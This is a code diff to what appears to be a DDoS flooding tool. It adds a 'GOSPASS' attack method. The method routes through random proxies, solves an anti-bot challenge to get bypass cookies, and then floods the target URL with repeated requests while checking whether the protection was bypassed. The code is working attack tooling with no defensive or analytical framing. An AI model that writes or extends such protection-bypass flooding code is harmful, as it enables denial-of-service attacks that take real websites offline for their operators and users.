@@ -23,10 +23,12 @@ from . import proxy_proto
 from .core import Methods
 from .proto import DatagramFloodIO, FloodIO, FloodOp, FloodSpec, FloodSpecType, TrexIO
 from .proxies import NoProxySet, ProxySet
+from aiohttp_socks import ProxyConnector
 from .targets import Target
 from .vendor.referers import REFERERS
 from .vendor.rotate import params as rotate_params, suffix as rotate_suffix
 from .vendor.useragents import USERAGENTS
+from .utils import GOSSolver
 
 
 USERAGENTS = list(USERAGENTS)
@@ -430,6 +432,54 @@ class AsyncTcpFlood(FloodBase):
                     # XXX: we need to track in/out traffic separately
                     async with async_timeout.timeout(self._settings.http_response_timeout_seconds):
                         await response.read()
+        return packets_sent > 0
+
+    async def GOSPASS(self, on_connect=None) -> bool:
+        packets_sent = 0
+        user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36"
+        proxy_url = self._proxies.pick_random()
+        connector = ProxyConnector.from_url(proxy_url, ssl=False)
+        req_timeout = self._settings.http_response_timeout_seconds
+        cl_timeout = aiohttp.ClientTimeout(
+            connect=self._settings.connect_timeout_seconds, total=15)
+        solver = GOSSolver()
+        async with aiohttp.ClientSession(
+            connector=connector,
+            timeout=cl_timeout,
+        ) as s:
+            async with s.get(
+                solver.path,
+                # XXX: more headers
+                headers={
+                    "User-Agent": user_agent,
+                    "Accept": "application/json",
+                    "Accept-Encoding": "gzip, deflate"
+                },
+            ) as response:
+                payload = dict(await response.json())
+                if not "cn" in payload:
+                    raise RuntimeError("Invalid challenge payload")
+            if on_connect and not on_connect.done():
+                on_connect.set_result(True)
+            (latest_ts, cookies) = solver.solve(user_agent, payload)
+            print("solved", payload, cookies)
+            s.cookie_jar.update_cookies(cookies)
+            for ind in range(100):
+                if time.time() > latest_ts: break
+                async with s.get(
+                    self._url.human_repr(),
+                    # XXX: more headers
+                    headers = {
+                        "User-Agent": user_agent,
+                    },
+                ) as response:
+                    print(f"got response ind={ind} proxy={proxy_url} {response.request_info}")
+                    packets_sent += 1
+                    async with async_timeout.timeout(req_timeout):
+                        body = await response.read()
+                        # XXX: this is actually quite slow to detect
+                        bypass = solver.verify(body)
+                        print(f"got body ind={ind} bypass={bypass} size={len(body)}")
         return packets_sent > 0
 
     async def CFB(self, on_connect=None) -> bool:
